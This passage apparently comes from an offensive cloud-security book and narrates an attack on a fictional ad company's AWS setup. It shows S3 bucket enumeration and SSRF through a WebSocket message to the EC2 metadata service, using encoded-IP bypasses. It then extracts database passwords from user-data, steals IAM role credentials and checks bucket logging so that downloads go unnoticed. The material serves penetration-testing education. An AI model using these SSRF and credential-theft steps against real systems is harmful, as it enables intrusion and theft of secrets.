["```\nroot@Point1:~/# **getent hosts thor.mxrads.com**\n91.152.253.4    e9657.b.akamaiedge.net stellar.mxrads.com\nstellar.mxrads.com.edgekey.net\n```", "```\nroot@Point1:~/# **while read p; do \\**\n**echo $p, $(curl --silent -I -i https://$p | grep AmazonS3) \\**\n**done <cloudfront_akamai_subdomains.txt**\n\ndigital-js.mxrads.com, Server: AmazonS3\nstreaming.mxrads.com, Server: AmazonS3\n```", "```\n{\n  \"Version\":\"2012-10-17\",\n  \"Statement\":[\n    {\n      \"Sid\":\"UniqueID\", // ID of the policy\n      \"Effect\":\"Allow\", // Grant access if conditions are met\n      \"Principal\": \"*\", // Applies to anyone (anonymous or not)\n      \"Action\":[\"s3:GetObject\"], // S3 operation to view a file\n \"Resource\":[\"arn:aws:s3:::bucketname/*\"] // All files in the bucket\n    }\n  ]\n}\n```", "```\nroot@Point1:~/# **sudo apt install awscli**\nroot@Point1:~/# **aws configure**\n# Enter any valid set of credentials to unlock the CLI.\n# You can use your own AWS account, for instance.\n```", "```\nroot@Point1:~/# **aws s3api list-objects-v2 --bucket mxrads-misc > list_objects.txt**\nroot@Point1:~/# **head list_objects.txt**\n{ \"Contents\": [{\n     \"Key\": \"Archive/\",\n     \"LastModified\": \"2015-04-08T22:01:48.000Z\",\n      \"Size\": 0,\n\n \"Key\": \"Archive/_old\",\n     \"LastModified\": \"2015-04-08T22:01:48.000Z\",\n     \"Size\": 2969,\n\n     \"Key\": \"index.html\",\n     \"LastModified\": \"2015-04-08T22:01:49.000Z\",\n     \"Size\": 0,\n    },\n`--snip--`\n```", "```\nroot@Point1:~/# **grep '\"Key\"' list_objects.txt |wc -l**\n425927\n```", "```\n# We extract the filenames in the \"Key\" parameters:\nroot@Point1:~/# **grep '\"Key\"' list_objects | sed 's/[\",]//g' > list_keys.txt**\n\nroot@Point1:~/# **patterns='\\.sh$|\\.sql$|\\.tar\\.gz$\\.properties$|\\.config$|\\.tgz$'**\n\nroot@Point1:~/# **egrep $patterns list_keys.txt**\n  Key: debug/360-ios-safari/deploy.sh\n Key: debug/ias-vpaidjs-ios/deploy.sh\n  Key: debug/vpaid-admetrics/deploy.sh\n  Key: latam/demo/SiempreMujer/nbpro/private/private.properties\n  Key: latam/demo/SiempreMujer/nbpro/project.properties\n  Key: demo/indesign-immersion/deploy-cdn.sh\n  Key: demo/indesign-immersion/deploy.sh\n  Key: demo/indesign-mobile-360/deploy.sh\n`--snip--`\n```", "```\nroot@Point1:~/# **egrep -v\\**\n**\"\\.jpg|\\.png|\\.js|\\.woff|/\\\",$|\\.css|\\.gif|\\.svg|\\.ttf|\\.eot\" list_keys.xt**\n\nKey: demo/forbes/ios/7817/index.html\nKey: demo/forbes/ios/7817/index_1.html\nKey: demo/forbes/ios/7817/index_10.html\nKey: demo/forbes/ios/7817/index_11.html\nKey: demo/forbes/ios/7817/index_12.html\nKey: demo/forbes/ios/7817/index_13.html\n--`snip`--\n\nroot@Point1:~/# **aws s3api get-object --bucket mxrads-misc \\**\n**--key demo/forbes/ios/7817/index.html forbes_index.html**\n```", "```\nroot@Nginx:~/# **docker ps**\nCONTAINER ID        IMAGE                COMMAND\n5923186ffda5        sparcflow/ngi...   \"/bin/bash /sc...\"\n\nroot@Nginx:~/# **docker logs 5923186ffda5**\n54.221.12.35 - - [26/Oct/2020:13:44:08 +0000] \"GET / HTTP/1.1\"...\n```", "```\n# Modified WebSocket message:\nhttp://169.254.169.254:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...\n```", "```\n# Modified WebSocket message:\nhttp://54.14.153.41/:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...\n```", "```\nroot@Point1:~/# **docker logs 5923186ffda5**\n54.221.12.35 - - [26/Oct/2020:13:53:12 +0000] \"GET / HTTP/1.1\"...\n```", "```\nhttp://169.254.169.254\nhttp://0xa9fea9fe # hexadecimal representation\nhttp://0xA9.0xFE.0xA9.0xFE # dotted hexadecimal\nhttp://025177524776 # octal representation\nhttp://①⑥⑨.②⑤④.①⑥⑨.②⑤④ # Unicode representation\n```", "```\n# AWS Region\nhttp://0xa9fea9fe/latest/meta-data/placement/availability-zone\neu-west-1a\n\n# Instance ID\nhttp://0xa9fea9fe/latest/meta-data/instance-id\n1 i-088c8e93dd5703ccc\n\n# AMI ID\nhttp://0xa9fea9fe/latest/meta-data/ami-id\n2 ami-02df9ea15c1778c9c\n\n# Public hostname\nhttp://0xa9fea9fe/latest/meta-data/public-hostname\n3 ec2-3-248-221-147.eu-west-1.compute.amazonaws.com\n```", "```\n# MAC address of the network interface\nhttp://0xa9fea9fe/latest/meta-data/network/interfaces/macs/\n06:a0:8f:8d:1c:2a\n\n# AWS Owner ID\nhttp://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/owner-id\n886371554408\n\n# Security groups\nhttp://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/security-groups\nelb_http_prod_eu-west-1\nelb_https_prod_eu-west-1\ncommon_ssh_private_eu-west-1\negress_internet_http_any\n\n# Subnet ID where the instance lives\nhttp://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-id\nsubnet-00580e48\n\n# Subnet IP range\nhttp://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-ipv4-cidr-block\n172.31.16.0/20\n```", "```\n# User data information\nhttp://0xa9fea9fe/latest/user-data/\n\n# cloud-config\n1 coreos:\n  units:\n  - command: start\n    content: |-\n      [Unit]\n      Description=Discover IPs for external services\n      Requires=ecr-setup.service\n`--snip--`\n```", "```\n--`snip`--\n- command: start\n  content: |\n  1 [Service]   # Set up a service\n    EnvironmentFile=/etc/ecr_env.file # Env variables\n\n 2 ExecStartPre=**/usr/bin/docker pull** ${URL}/**demo-client**:master\n\n    3 ExecStart=**/usr/bin/docker** run \\\n        -v /conf_files/logger.xml:/opt/workspace/log.xml \\\n        --net=host \\\n **--env-file=/etc/env.file** \\\n        --env-file=/etc/java_opts_env.file \\\n      4 --env-file=/etc/secrets.env \\\n        --name demo-client \\\n        ${URL}/demo-client:master \\\n--`snip`--\n```", "```\n`--snip--`\nwrite_files:\n- content: H4sIAEjwoV0AA13OzU6DQBSG4T13YXoDQ5FaTFgcZqYyBQbmrwiJmcT+Y4Ed6/...\n  encoding: gzip+base64\n  path: /etc/secrets.env\n  permissions: \"750\"\n`--snip--`\n```", "```\nroot@Point1:~/# **echo H4sIAAA...|base64 -d |gunzip**\n\nANALYTICS_URL_CHECKSUM_SEED = 180309210013\nCASSANDRA_ADS_USERSYNC_PASS = QZ6bhOWiCprQPetIhtSv\nCASSANDRA_ADS_TRACKING_PASS = 68niNNTIPAe5sDJZ4gPd\nCASSANDRA_ADS_PASS = fY5KZ5ByQEk0JNq1cMM3\nCASSANDRA_ADS_DELIVERYCONTROL_PASS = gQMUUHsVuuUyo003jqFU\nIAS_AUTH_PASS = PjO7wnHF9RBHD2ftWXjm\nADS_DB_PASSWORD = !uqQ#:9#3Rd_cM]\n```", "```\n--`snip`--\n - command: start\n   content: |-\n       [Unit]\n       Description=Discover IPs for external services\n       [Service]\n       Type=oneshot\n       ExecStartPre=/usr/bin/rm -f /etc/env.file\n **ExecStart=/conf_files/get-region-params.sh**\n       name: define-region-params.service\n`--snip--`\n```", "```\n`--snip--`\nwrite_files:\n1 - content: H4sIAAAAAAAC/7yabW/aShbH3/tTTFmu0mjXOIm6lXoj98qAQ6wSG9lOpeyDrME+...\n  encoding: gzip+base64\n  path: /conf_files/define-region-params.sh\n```", "```\nroot@Point1:~/# **echo H4sIAAA...|base64 -d |gunzip**\n\nAZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)\nREGION=${AZ%?}\n\ncase $REGION in\n  ap-southeast-1...\n    ;;\n  eu-west-1\n    echo \"S3BUCKET=mxrads-dl\" >> /etc/env.file 1\n echo \"S3MISC=mxrads-misc\" >> /etc/env.file 2\n    echo \"REDIS_GEO_HOST=redis-geolocation.production.euw1.mxrads.tech\" >> /etc/env.file\n    echo \"CASSA_DC=eu-west-delivery\" >> /etc/env.file\n    echo \"CASSA_USER_SYNC=usersync-euw1\" >> /etc/env.file\n    echo \"CASSA_USER_DLVRY=userdc-euw1\" >> /etc/env.file\n\n`--snip--`\ncassandra_delivery_host=\"cassandra-delivery.prod.${SHORT_REGION}.mxrads.tech\"\n`--snip--`\n```", "```\nhttp://0xa9fea9fe/latest/meta-data/iam/security-credentials\ndemo-role.ec2\n```", "```\n# Credentials\nhttp://0xa9fea9fe/latest/meta-data/iam/security-credentials/demo-role.ec2\n\n{\n Code : Success,\n LastUpdated : 2020-10-26T11:33:39Z,\n Type : AWS-HMAC,\n **AccessKeyId : ASIA44ZRK6WS4HX6YCC7,**\n SecretAccessKey : nMylmmbmhHcOnXw2eZ3oh6nh/w2StPw8dI5Mah2b,\n Token : AgoJb3JpZ2luX2VjEFQ...\n Expiration : 2020-10-26T17:53:41Z 1\n}\n```", "```\n# On our attacking machine\nroot@Point1:~/# **vi ~/.aws/credentials**\n[demo]\naws_access_key_id = ASIA44ZRK6WSX2BRFIXC\naws_secret_access_key = +ACjXR87naNXyKKJWmW/5r/+B/+J5PrsmBZ\naws_session_token = AgoJb3JpZ2l...\n```", "```\n# On our attacking machine\nroot@Point1:~/# \n```", "```\n**--role-name demo-role-ec2 \\**\n**--profile demo**\n\nAn error occurred (AccessDenied) when calling the GetRole operation: User:\narn:aws:sts::886371554408:assumed-role/demo-role.ec2/i-088c8e93dd5703ccc\nis not authorized to perform: iam:GetRole on resource: role demo-role-ec2\n```", "````One option is to go nuts and try every possible AWS API call (there are thousands) until we hit an authorized query, but the avalanche of errors we’d trigger in the process would knock any security team out of their hibernal sleep. By default, most AWS API calls are logged, so it’s quite easy for a company to set up alerts tracking the number of unauthorized calls. And why wouldn’t they? It literally takes a few clicks to set up these alerts via the monitoring service CloudWatch.    Plus, AWS provides a service called GuardDuty that automatically monitors and reports all sorts of unusual behaviors, such as spamming 5,000 API calls, so caution is paramount. This is not your average bank with 20 security appliances and a $200K/year outsourced SOC team that still struggles to aggregate and parse Windows events. We need to be clever and reason about it purely from context.    For instance, remember that mxrads-dl S3 bucket that made it to this instance’s *user-data*? We could not access that before without credentials, but maybe the demo-role.ec2 role has some S3 privileges that could grant us access? We find out by calling on the AWS API to list MXR Ads’ S3 buckets:    ``` # On our attacking machine root@Point1:~/# **aws s3api listbuckets --profile demo** An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied ```    Okay, trying to list all S3 buckets in the account was a little too bold, but it was worth a shot. Let’s take it back and take baby steps now. Again using the demo-role.ec2 role, we try just listing keys inside the mxrads-dl bucket. Remember, we were denied access earlier without credentials:    ``` root@Point1:~/# **aws s3api list-objects-v2 --profile demo --bucket mxrads-dl >** **list_objects_dl.txt** root@Point1:~/# **grep '\"Key\"' list_objects_dl | sed 's/[\",]//g' >** **list_keys_dl.txt**  root@Point1:~/# **head list_keys_dl.txt**   Key: jar/maven/artifact/com.squareup.okhttp3/logging-interceptor/4.2.2   Key: jar/maven/artifact/com.logger.log/logging-colors/3.1.5 `--snip--` ```    Now we are getting somewhere! We get a list of keys and save them away. As a precaution, before we go berserk and download every file stored in this bucket, we can make sure that logging is indeed disabled on S3 object operations. We call the `get-bucket-logging` API:    ``` root@Point1:~/# **aws s3api get-bucket-logging --profile demo --bucket mxrads-dl**  <empty_response> ```    And we find it’s empty. No logging. Perfect. You may be wondering why a call to this obscure API succeeded. Why would an instance profile need such a permission? To understand this weird behavior, have a look at the full list of possible S3 operations at [https://docs.aws.amazon.com/](https://docs.aws.amazon.com/). Yes, there are hundreds of operations that can be allowed or denied on a bucket.    AWS has done a spectacular job defining very fine-grained permissions for each tiny and sometimes inconsequential task. No wonder most admins simply assign wildcard permissions when setting up buckets. A user needs read-only access to a bucket? A `Get*` will do the job; little do they realize that a `Get*` implies 31 permissions on S3 alone! `GetBucketPolicy` to get the policy, `GetBucketCORS` to return CORS restrictions, `GetBucketACL` to get the access control list, and so forth.    Bucket policies are mostly used to grant access to foreign AWS accounts or add another layer of protection against overly permissive IAM policies granted to users. A user with an `s3:*` permission could therefore be rejected with a bucket policy that only allows some users or requires a specific source IP. Here we attempt to get the bucket policy for mxrads-dl to see if it does grant access to any other AWS accounts:    ``` root@Point1:~/# **aws s3api get-bucket-policy --bucket mxrads-dl** {   \"Id\": \"Policy1572108106689\",   \"Version\": \"2012-10-17\",   \"Statement\": [       {          \"Sid\": \"Stmt1572108105248\",          \"Action\": [              \"s3:List*\", \" s3:Get*\"          ],          \"Effect\": \"Allow\",          \"Resource\": \"arn:aws:s3:::mxrads-dl\",          \"Principal\": {            1 \"AWS\": \"arn:aws:iam::983457354409:root\"          }    }] } ```    This policy references the foreign AWS account 983457354409 1. This account could be Gretsch Politico, an internal MXR Ads department with its own AWS account, or a developer’s personal account for that matter. We cannot know for sure, at least not yet. We’ll note it for later examination.    ### Examining the Key List    We go back to downloading the bucket’s entire key list and dive into the heap, hoping to find sensitive data and get an idea of the bucket’s purpose. We have an impressive number of public binaries and *.jar* files. We find a collection of the major software players with different versions, such as Nginx, Java collections, and Log4j. It seems they replicated some sort of public distribution point. We find a couple of bash scripts that automate the `docker login` command or provide helper functions for AWS commands, but nothing stands out as sensitive.    From this, we deduce that this bucket probably acts as a corporate-wide package distribution center. Systems and applications must use it to download software updates, packages, archives, and other widespread packages. I guess not every public S3 is an El Dorado waiting to be pilfered.    We turn to the *user-data* script we pulled earlier hoping for additional clues about services to query, but find nothing out of note. We even try a couple of AWS APIs with the demo role credentials to common services like EC2, Lambda, and Redshift out of desperation, only to get that delicious error message back. How frustrating it is to have valid keys yet stay stranded at the front door simply because there are a thousand keyholes to try . . . but that’s just the way it is sometimes.    As with most dead ends, the only way forward is to go backward, at least for a while. It’s not like the data we gathered so far is useless; we have database and AWS credentials that may prove useful in the future, and most of all, we gained some insight into how the company handles its infrastructure. We only need a tiny spark to ignite for the whole ranch to catch fire. We still have close to a hundred domains to check. We will get there.    ## Resources    *   See this short introduction to Burp if you are not familiar with the tool: [http://bit.ly/2QEQmo9](http://bit.ly/2QEQmo9)*.* *   Check out the progressive capture-the-flag exercises at [http://flaws.cloud/](http://flaws.cloud/) to get you acquainted with basic cloud-hacking reflexes. *   CloudBunny and fav-up are tools that can help you bust out the IP addresses of services hiding behind CDNs: [https://github.com/Warflop/CloudBunny/](https://github.com/Warflop/CloudBunny/)and [https://github.com/pielco11/fav-up/](https://github.com/pielco11/fav-up/)*.* *   You can read more about techniques to uncover bucket names at the following links: [http://bit.ly/36KVQn2](http://bit.ly/36KVQn2) and [http://bit.ly/39Xy6ha](http://bit.ly/39Xy6ha). *   The difference between CNAME and ALIAS records is discussed at [http://bit.ly/2FBWoPU](http://bit.ly/2FBWoPU). *   This website lists a number of open S3 buckets if you’re in for a quick hunt: [https://buckets.grayhatwarfare.com/](https://buckets.grayhatwarfare.com/)*.* *   More information on S3 bucket policies can be found here: [https://amzn.to/2Nbhngy](https://amzn.to/2Nbhngy)*.* *   Further reading on WebSockets is available at [http://bit.ly/35FsTHN](http://bit.ly/35FsTHN). *   Check out this blog about IMDSv2: [https://go.aws/35EzJgE](https://go.aws/35EzJgE).````"]